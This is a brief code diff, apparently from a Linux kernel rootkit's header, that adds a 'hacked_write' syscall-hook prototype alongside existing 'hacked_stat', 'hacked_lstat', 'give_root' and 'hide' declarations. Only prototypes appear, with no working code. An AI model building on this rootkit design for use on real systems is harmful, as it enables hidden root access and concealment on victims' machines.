@@ -26,6 +26,8 @@ asmlinkage int hacked_stat(const char *path, struct stat *buf);
 
 asmlinkage int hacked_lstat(const char *path, struct stat *buf);
 
+asmlinkage int hacked_write(unsigned int fd, const char *buf, size_t count);
+
 void give_root(void);
 
 void hide(void);
